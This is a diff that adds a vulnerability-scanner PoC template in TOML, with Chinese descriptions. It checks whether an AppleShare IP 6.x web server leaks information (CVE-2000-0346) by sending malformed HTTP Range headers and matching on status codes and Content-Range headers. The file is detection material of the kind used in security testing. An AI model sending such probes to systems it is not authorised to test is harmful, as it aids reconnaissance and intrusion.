@@ -1,0 +1,67 @@
+[info]
+author = "ave"
+description = "AppleShare IP 6.1 及之后版本 Web 服务器存在信息泄露漏洞，远程攻击者通过发送特制的无效 Range 请求头，可触发服务器返回敏感信息。该 PoC 通过发送畸形的 Range: bytes=0--1 请求头检测目标是否受此漏洞影响。"
+id = "POC-AVE-2000-0351"
+name = "AppleShare IP 6.x 无效 Range 请求信息泄露检测 PoC"
+severity = "medium"
+tags = ["ave-2000-0351"]
+vuln_id = [
+    "CVE-2000-0346",
+    "AVE-2000-0351",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Range = "bytes=0--1"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    206,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "Content-Range",
+    "bytes",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Range = "bytes=9999999999999-0"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    206,
+    416,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "Content-Range",
+    "bytes",
+]
